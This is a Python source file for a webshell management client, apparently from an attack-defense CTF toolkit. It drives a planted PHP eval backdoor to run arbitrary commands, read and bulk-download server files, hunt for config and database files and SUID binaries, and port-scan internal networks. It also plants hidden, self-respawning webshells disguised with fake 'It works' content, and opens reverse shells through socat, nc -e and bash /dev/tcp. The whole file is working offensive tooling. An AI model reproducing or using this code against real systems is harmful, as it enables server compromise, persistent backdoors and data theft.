#!/usr/bin/env python
# encoding: utf-8

from core.utils.string_utils.random_string import random_string
from core.utils.string_utils.list2string import list2string
from core.utils.http.build_url import build_url
from core.utils.http.get_domain import get_domain
from core.utils.hash.file import hash_file
from core.log import Log

import requests
import string
import os
import json

class WebShell():
    url = "http://127.0.0.1/c.php"
    method = "POST"
    password = "c"
    webroot = ""
    working = False
    php_version = ""
    kernel_version = ""
    disabled_functions = []
    def __init__(self, url, method, password):
        self.url = url
        self.method = method
        self.password = password
        self.init(self.url, self.method, self.password)
        self.info = {
            "url":self.url,
            "method":self.method,
            "password":self.password
        }
        if self.working:
            self.webroot = self.get_webroot()[1]
            self.php_version = self.get_php_version()
            self.kernel_version = self.get_kernel_version()
            self.print_info()

    def php_code_exec(self, code):
        # TODO : 自己实现这个函数
        key = random_string(8, string.ascii_letters)
        god_code = "eval($_POST[%s]);" % (key)
        code = "@ob_start('ob_gzip');" + code + "@ob_end_flush();"
        try:
            if self.method == "POST":
                data = {self.password:god_code, key:code}
                response = requests.post(self.url, data=data, timeout=5)
            elif self.method == "GET":
                params = {self.password:code}
                response = requests.get(self.url, params=params, timeout=5)
            else:
                return (False, "Unsupported method!")
            content = response.text
            return (True, content)
        except:
            Log.error("The connection is aborted!")
            return (False, "The connection is aborted!")

    '''
    def get_self_content(self):
        result = self.php_code_exec_token("var_dump(readfile(__FILE__);")
        print result
        if result[0]:
            content = result[1]
            return content
        return False
        '''

    def get_webroot(self):
        return self.php_code_exec_token("echo $_SERVER['DOCUMENT_ROOT']")

    def get_php_version(self):
        if self.php_version != "":
            # Log.success("PHP Version : \n\t%s" % (self.php_version))
            return self.php_version
        result = self.auto_exec("php -v")
        if result[0]:
            # Log.success("PHP Version : \n\t%s" % (result[1][0:-1]))
            return result[1][0:-1]
        else:
            Log.error("Error occured while getting php version! %s" % result[1])
            return ""

    def get_kernel_version(self):
        if self.kernel_version != "":
            # Log.success("Kernel Version : \n\t%s" % (self.kernel_version))
            return self.kernel_version
        result = self.auto_exec("uname -a")
        if result[0]:
            # Log.success("Kernel Version : \n\t%s" % (result[1][0:-1]))
            return result[1][0:-1]
        else:
            Log.error("Error occured while getting kernel version! %s" % result[1])
            return ""

    def print_info(self):
        Log.success("=" * 32)
        Log.success("URL : %s" % (self.url))
        Log.success("Method : %s" % (self.method))
        Log.success("Password : %s" % (self.password))
        Log.success("Document Root : %s" % (self.webroot))
        Log.success("=" * 32)
        Log.success("PHP version : \n\t%s" % (self.php_version))
        Log.success("Kernel version : \n\t%s" % (self.kernel_version))
        Log.success("=" * 32)
        Log.success("WebRoot : %s" % (self.webroot))
        Log.success("=" * 32)

    def read_file(self, filepath):
        Log.info("Reading file : [%s] ..." % (filepath))
        result = self.php_code_exec_token("echo file_get_contents('%s');" % filepath)
        if result[0]:
            Log.success("Content : \n%s" % (result[1]))
        else:
            Log.error("Error occured! %s" % result[1])

    def get_writable_directory(self):
        command = "find %s -type d -writable" % (self.webroot)
        output = self.auto_exec(command)
        if output[0]:
            if output[1] == "":
                Log.warning("Nothing found!")
                return []
            else:
                Log.success("Found : \n%s" % output[1][0:-1])
                writable_dirs = []
                for d in output[1].split("\n")[0:-1]:
                    if not d.startswith("find: '"):
                        writable_dirs.append(d)
                return writable_dirs
        else:
            Log.error("Error occured! %s" % output[1])
            return []

    def auto_inject_memery_webshell(self, filename, password):
        content = '<?php eval($_REQUEST["%s"]);?>' % (password)
        Log.info("Building webshell : %s" % (repr(content)))
        self.auto_inject_memery_phpfile(filename, content)

    def auto_inject_memery_phpfile(self, filename, content):
        Log.info("Auto inject memery webshell...")
        webshell_content = "<?php set_time_limit(0); ignore_user_abort(true); $filename = '%s'; $shell = '%s'; $fake = '<?php print_r(\"It works!\")?>'; $content = $shell.'\r'.$fake.str_repeat(' ', strlen($shell) - strlen($fake)).'\n'; unlink(__FILE__); while(true){ if (!file_exists($filename)){ file_put_contents($filename, $content); } usleep(0x10); } ?>" % (filename, content)
        Log.info("Code : [%s]" % (repr(webshell_content)))
        base64_encoded_webshell = webshell_content.encode("base64").replace("\n", "")
        writable_dirs = self.get_writable_directory()
        for writable_dir in writable_dirs:
            Log.info("-" * 32)
            memery_webshell_filename = ".index.php"
            base_url = "%s%s/" % ("".join(["%s/" % (i) for i in self.url.split("/")[0:3]]), writable_dir.replace("%s/" % (self.webroot), ""))
            url = base_url + memery_webshell_filename
            path = "%s/%s" % (writable_dir, memery_webshell_filename)
            code = "if(file_put_contents('%s', base64_decode('%s'))){echo 'Success!';}else{echo 'Failed!';}" % (path, base64_encoded_webshell)
            code_exec_result = self.php_code_exec_token(code)[1]
            if ("Success!" in code_exec_result):
                Log.success("Injection finished!")
                Log.info("Trying to visit : [%s] to active the webshell..." % (url))
                Log.info("Setting timeout to 1 second ...")
                try:
                    response = requests.get(url, timeout=1)
                    Log.error("Error! Maybe the directory cannnot execute php script!")
                    Log.error("\n%s\n" % (response.content))
                except Exception as e:
                    error_content = str(e)
                    if "Read timed out" in error_content:
                        Log.success("Webshell actived! (%s)" % (error_content))
                        webshell_url = "%s%s" % (base_url, filename)
                        Log.info("Url : %s" % (webshell_url))
                        Log.info("Content : %s" % (repr(content)))
                        with open("Webshell.txt", "a+") as f:
                            log_content = "%s => %s\n" % (webshell_url, repr(content))
                            f.write(log_content)
                    else:
                        Log.error("Error! Maybe the directory is not writable!")
            else:
                Log.error("Error! Maybe the directory is not writable!")

    def get_suid_binaries(self):
        paths = ['/usr/local/sbin', '/usr/local/bin', '/usr/sbin', '/usr/bin', '/sbin', '/bin', '/usr/games', '/usr/local/games', '/snap/bin']
        for path in paths:
            command = "find %s -user root -perm -4000 -exec ls -ldb {} \;" % (path)
            Log.info("Executing : %s" % (command))
            output = self.auto_exec(command)
            if output[0]:
                if output[1] == "":
                    Log.warning("Nothing found!")
                else:
                    Log.success("Found : \n%s" % output[1])
            else:
                Log.error("Error occured! %s" % output[1])

    def get_disabled_functions(self):
        if len(self.disabled_functions) != 0:
            Log.success("Disabled functions : \n%s" % list2string(self.disabled_functions, "\t[", "]\n"))
            return
        result = self.php_code_exec_token("echo ini_get('disable_functions');")
        if result[0]:
            if result[1] == "":
                Log.warning("No function disabled!")
                self.disabled_functions = []
            else:
                self.disabled_functions = result[1].split(",")[0:-1]
                Log.success("Disabled functions : \n%s" % list2string(self.disabled_functions, "\t[", "]\n"))
        else:
            Log.error("Error occured! %s" % result[1])

    def get_writable_php_file(self):
        command = "find %s -name '*.php' -writable" % (self.webroot)
        output = self.auto_exec(command)
        if output[0]:
            if output[1] == "":
                Log.warning("Nothing found!")
            else:
                Log.success("Found : \n%s" % output[1])
        else:
            Log.error("Error occured! %s" % output[1])

    def port_scan(self, hosts, ports):
        Log.info("Starting port scan... %s => [%s]" % (hosts, ports))
        code = "set_time_limit(0);error_reporting(0);$ports_input='%s';$hosts_input='%s';$timeout=0.5;$ports=explode(',', $ports_input);$hosts_array=explode('/', $hosts_input);$ip=ip2long($hosts_array[0]);$net_mask=intval($hosts_array[1]);$range=pow(2, (32 - $net_mask));$start=$ip >> (32 - $net_mask) << (32 - $net_mask);for ($i=0;$i < $range;$i++) {$h=long2ip($start + $i);foreach ($ports as $p) {$c=@fsockopen($h, intval($p), $en, $es, $timeout);if (is_resource($c)) {echo $h.':'.$p.' => open\n';fclose($c);} else {echo $h.':'.$p.' => '.$es.'\n';}ob_flush();flush();}}" % (ports, hosts)
        Log.info("Executing : \n%s" % code)
        result = self.php_code_exec_token(code)
        if result[0]:
            Log.success("Result : \n%s" % (result[1]))
        else:
            Log.error("Error occured! %s" % result[1])

    def get_config_file(self):
        keywords = ["config", "db", "database"]
        for key in keywords:
            Log.info("Using keyword : [%s]..." % (key))
            command = "find %s -name '*%s*'" % (self.webroot, key)
            output = self.auto_exec(command)
            if output[0]:
                if output[1] == "":
                    Log.warning("Nothing found!")
                else:
                    Log.success("Found : \n%s" % output[1])
            else:
                Log.error("Error occured! %s" % output[1])

    def check_working(self, url, method, auth):
        Log.info("Checking whether the webshell is still work...")
        flag = random_string(32, string.letters)
        token = random_string(32, string.letters)
        Log.info("Using challenge flag : [%s]" % (flag))
        Log.info("Using token : [%s]" % (token))
        code = "echo '%s'; echo '%s'; echo '%s';" % (token, flag, token)
        result = self.php_code_exec(code)
        if result[0]:
            content = result[1]
            for i in content.split(token):
                if i == flag:
                    return True
        return False
        '''
        method = string.upper(method)
        if method == "POST" or method == "REQUEST":
            Log.info("Using POST method...")
            data = {auth:'echo "'+token+'";echo "'+flag+'";echo "'+token+'";'}
            response = requests.post(url, data=data)
        elif method == "GET":
            Log.info("Using GET method...")
            params = {auth:'echo "'+token+'";echo "'+flag+'";echo "'+token+'";'}
            url = build_url(url, params)
            data = {key:value}
            response = requests.post(url, data=data)
        else:
            Log.error("Unsupported method!")
            return False
        content = response.content
        # Log.success("The content is :\n " + content)
        '''

    def check_connection(self, url):
        Log.info("Checking the connection to the webshell...")
        try:
            response = requests.head(url)
            code = response.status_code
            if code != 200:
                Log.warning("The status code is %d, the webshell may have some problems..." % (response.status_code))
            else:
                Log.success("The status code is %d" % (response.status_code))
            return True
        except:
            Log.error("Connection error!")
            return False

    def init(self, url, method, password):
        if self.check_connection(url):
            self.working = True
        else:
            self.working = False
            return

        if self.check_working(url, method, password):
            Log.success("It works well!")
            self.working = True
        else:
            Log.error("It dead!")
            self.working = False
            return


    def function_call(self, function_name, args):
        # TODO 函数调用 , 可以使用类似回调函数这样的调用方式来绕过WAF
        pass

    def php_command_exec(self,function, command):
        code = "%s(base64_decode('%s'));" % (function, ("%s 2>&1" % command).encode("base64").replace("\n", ""))
        return self.php_code_exec_token(code);
    '''
        try:
            tick = random_string(3, string.letters)
            token = random_string(32, string.letters)
            if self.method == "POST":
                response = requests.post(self.url, data=data)
            elif self.method == "GET":
                params = {self.password:"@ini_set('display_errors', '0');echo '"+token+"';"+function+"($_GET["+tick+"]);echo '"+token+"';", tick:command+ " 2>&1"}
                response = requests.get(self.url, params=params)
            else:
                return (False, "Unsupported method!")
            content = response.text
            if token in content:
                return (True, content.split(token)[1])
            else:
                return (False, content)
        except Exception as e:
            Log.error(e)
            return (False, e)
            '''

    def php_code_exec_token(self, code):
        token = random_string(32, string.letters)
        code = 'echo "%s";%s;echo "%s";' % (token, code, token)
        result = self.php_code_exec(code)
        if result[0]:
            content = result[1]
            return (True, content.split(token)[1])
        else:
            content = "Time out!"
            return (False, content)


    def auto_exec_print(self, command):
        result = self.auto_exec(command)
        if result[0]:
            Log.success("Result : \n%s" % (repr(result[1][0:-1])).replace("\\n", "\n")[2:-1])
        else:
            Log.error("Error occured! %s" % (repr(result[1][0:-1])).replace("\\n", "\n")[2:-1])


    def auto_exec(self, command):
        # TODO 根据当前环境 , 结合被禁用的函数 , 自动判断使用哪个函数进行命令执行
        return self.php_system(command)

    def php_shell_exec(self, command):
        return self.php_command_exec("echo shell_exec", command)

    def php_system(self, command):
        return self.php_command_exec("system", command)

    def php_popen(self, command):
        # TODO
        pass

    def php_proc_open(self, command):
        # TODO
        pass

    def php_exec(self, command):
        return self.php_command_exec("exec", command)

    def php_passthru(self, command):
        # TODO
        pass

    def reverse_shell_socat(self, binary, ip, port):
        Log.success("Using socat to get a reverse shell...")
        return self.auto_exec("%s tcp-connect:%s:%s exec:'bash -li',pty,stderr,setsid,sigint,sane" % (binary, ip, port))

    def reverse_shell_nc(self, binary, ip, port):
        Log.success("Using nc to get a reverse shell...")
        return self.auto_exec("%s -e /bin/sh %s %s" % (binary, ip, port))

    def reverse_shell_bash(self, ip, port):
        Log.success("Using bash to get a reverse shell...")
        return self.auto_exec("bash -c 'sh -i >&/dev/tcp/%s/%s 0>&1'" % (ip, port))

    def reverse_shell(self, ip, port):
        result = self.check_bin_exists("socat")
        if result[0]:
            content = result[1][0:-1]
            if content != "":
                path = content
                Log.success("socat found! Path : [%s]" % path)
                self.reverse_shell_socat(path, ip, port)
                return
            else:
                Log.error("socat not found!")
        else:
            Log.error("Some error occured!")
        result = self.check_bin_exists("nc")
        if result[0]:
            content = result[1][0:-1]
            if content != "":
                path = content
                Log.success("nc found! Path : [%s]" % path)
                self.reverse_shell_nc(path, ip, port)
                return
            else:
                Log.error("nc not found!")
        else:
            Log.error("Some error occured!")
        self.reverse_shell_bash(ip, port)
        return

    def check_bin_exists(self, binary):
        Log.info("Checking the binary file : [%s]" % binary)
        return self.auto_exec("which %s" % (binary))

    def check_function_exist(self, function_name):
        result = self.php_code_exec_token('var_dump(function_exists(%s));' % (function_name))
        if result[0]:
            content = result[1]
            if "bool(true)" in content:
                Log.success("The function [%s] is existed!" % (function_name))
                return True
            else:
                Log.error("The function [%s] is not existed!" % (function_name))
                return False
        else:
            Log.error("Some error occured when exec php code...")
            return False

    def hash_remote_file(self, path):
        result = self.php_code_exec_token("echo md5(file_get_contents('%s'));" % (path))
        if result[0]:
            content = result[1]
            return content
        else:
            Log.error("Some error occured when exec php code...")
            return ""

    def download(self, remote_file_path, local_file_path):
        root = get_domain(self.url)
        path = root + local_file_path
        Log.info("Local path : [%s]" % (path))
        local_directory = path[0:-path[::-1].index("/")]
        Log.info("Creating : [%s]" % (local_directory))
        try:
            os.makedirs(local_directory)
        except Exception as e:
            Log.error(str(e))
        self.download_base(remote_file_path, path)


    def download_base(self, path, local_path):
        Log.info("Ready to downloading file : %s" % path)
        Log.info("Detacting local file exists...")
        exists = os.path.exists(local_path)
        if exists:
            Log.info("Checking remote file (%s) hash..." % (path))
            remote_hash = self.hash_remote_file(path)
            Log.info("Find md5 of remote file (%s) : %s" % (path, remote_hash))
            Log.info("Checking local file (%s) hash..." % (local_path))
            local_hash = hash_file(local_path)
            Log.info("Find md5 of local file (%s) : %s" % (local_path, local_hash))
            if remote_hash == local_hash:
                Log.warning("File haved downloaded! Ignored!")
                return
            else:
                Log.warning("File updated, downloading new version...")
        else:
            Log.error("Local file not exists...")
        result = self.php_code_exec_token('echo base64_encode(file_get_contents("%s"));' % (path))
        if result[0]:
            Log.success("Fetch data success! Start saving...")
            content = result[1]
            with open(local_path, "wb") as f:
                Log.info("Saving...")
                f.write(content.decode("base64"))
            Log.info("Download finished!")
        else:
            Log.error("Fetch data failed!")

    def download_recursion(self, path, filename_filter):
        root = get_domain(self.url)
        # List all dir and create them
        directories = self.get_all_directories(path)
        Log.success("Directories : \n%s" % list2string(directories, "\t[", "]\n"))
        Log.info("Create directories locally...")
        for d in directories:
            p = root + d
            Log.info("Creating : [%s]" % (p))
            try:
                os.makedirs(p)
            except Exception as e:
                Log.error(str(e))
        # Download
        Log.info("Listing all files...")
        result = self.auto_exec("find %s -type f -name '%s'" % (path, filename_filter))
        if result[0]:
            Log.success("Listing files success!")
            content = result[1].split("\n")[0:-1]
            for file in content:
                p = root + file
                Log.info("Downloading %s to %s" % (file, p))
                self.download_base(file, p)
        else:
            Log.error("Listing files error!")

    def download_advanced(self, path, args):
        root = get_domain(self.url)
        # List all dir and create them
        directories = self.get_all_directories(path)
        Log.success("Directories : \n%s" % list2string(directories, "\t[", "]\n"))
        Log.info("Create directories locally...")
        for d in directories:
            p = root + d
            Log.info("Creating : [%s]" % (p))
            try:
                os.makedirs(p)
            except Exception as e:
                Log.error(str(e))
        # Download
        Log.info("Listing all files...")
        result = self.auto_exec("find %s %s" % (path, args))
        if result[0]:
            Log.success("Listing files success!")
            content = result[1].split("\n")[0:-1]
            for file in content:
                p = root + file
                Log.info("Downloading %s to %s" % (file, p))
                self.download_base(file, p)
        else:
            Log.error("Listing files error!")

    def get_all_directories(self, path):
        command = "find %s -type d" % (path)
        result = self.auto_exec(command)
        if result[0]:
            content = result[1]
            directories = content.split("\n")[0:-1]
            return directories
        else:
            return []


    def file_exists(self, filename):
        Log.info("Checking file exists : [%s]" % filename)
        result = self.php_code_exec_token("var_dump(file_exists('%s'));" % (filename))
        if result[0]:
            Log.error("Checking finished successfully!")
            content = result[1]
            if "bool(true)" in content:
                Log.success("File (%s) is existed!" % (filename))
                return True
            return False
        else:
            Log.error("Some error occured while checking!")
            return False

    def is_directory(self, filename):
        Log.info("Checking file exists : [%s]" % filename)
        result = self.php_code_exec_token("var_dump(is_dir('%s'));" % (filename))
        if result[0]:
            Log.error("Checking finished successfully!")
            content = result[1]
            if "bool(true)" in content:
                Log.success("File (%s) is existed!" % (filename))
                return True
            return False
        else:
            Log.error("Some error occured while checking!")
            return False


    def auto_inject_webshell(self, filename, password):
        # TODO : remove arg filename
        webshell_content = "<?php eval($_REQUEST['%s']);?>" % (password)
        fake_content = "<?php print_r('It works');?>"
        padding = " " * (len(webshell_content) - len(fake_content))
        content = webshell_content + "\r" + fake_content + padding + "\n"
        urls = self.auto_inject_phpfile(filename, content)
        Log.success("Inject success : \n%s" % (urls))

    def auto_inject_flag_reaper(self, filename, content):
        # TODO : remove arg filename
        urls = self.auto_inject_phpfile(filename, content)
        success_numbers = 0
        for url in urls:
            Log.info("Trying to visit : [%s] to launch the flag reaper..." % (url))
            Log.info("Setting timeout to 1 second ...")
            try:
                response = requests.get(url, timeout=1)
                Log.error("Error! Maybe the directory cannnot execute php script!")
                Log.error("\n%s\n" % (response.content))
            except Exception as e:
                error_content = str(e)
                Log.info(error_content)
                if "Read timed out" in error_content:
                    Log.success("Actived!")
                    success_numbers += 1
                    # return True
                else:
                    Log.error("Error! Maybe the directory is not writable!")
        if success_numbers > 0:
            Log.success("Active finished : [%d/%d]" % (success_numbers, len(urls)))
            return True
        else:
            Log.error("All failed!")
            return False

    def auto_inject_phpfile(self, filename, webshell_content):
        Log.info("Auto injecting : [%s] => [%s]" % (filename, repr(webshell_content)))
        Log.info("Code : [%s]" % (repr(webshell_content)))
        Log.info("Length : [%d]" % (len(webshell_content)))
        Log.info("Getting writable dirs...")
        writable_dirs = self.get_writable_directory()
        urls = []
        if len(writable_dirs) == 0:
            Log.error("No writable dirs...")
            return False
        else:
            for writable_dir in writable_dirs:
                writable_dir += "/"
                filename = ".%s.php" % (random_string(16, string.letters + string.digits))
                Log.info("Writing [%s] into : [%s]" % (repr(webshell_content), writable_dir))
                php_code = "file_put_contents('%s',base64_decode('%s'));" % ("%s/%s" % (writable_dir, filename), webshell_content.encode("base64").replace("\n",""))
                self.php_code_exec(php_code)
                base_url = "%s%s" % ("".join(["%s/" % (i) for i in self.url.split("/")[0:3]]), writable_dir.replace("%s" % (self.webroot), ""))
                webshell_url = ("%s%s" % (base_url, filename)).replace("//", "/").replace("https:/", "https://").replace("http:/", "http://")
                with open("Webshell.txt", "a+") as f:
                    log_content = "%s => %s\n" % (webshell_url, repr(webshell_content))
                    f.write(log_content)
                urls.append(webshell_url)
        return urls

    def save(self, filename):
        webshell_config = json.load(open(filename, "a+"))
        config = {
            "url":self.url,
            "method":self.method,
            "password":self.password
        }
        webshell_config.append(config)
        json.dump(webshell_config, open(filename, "w"))

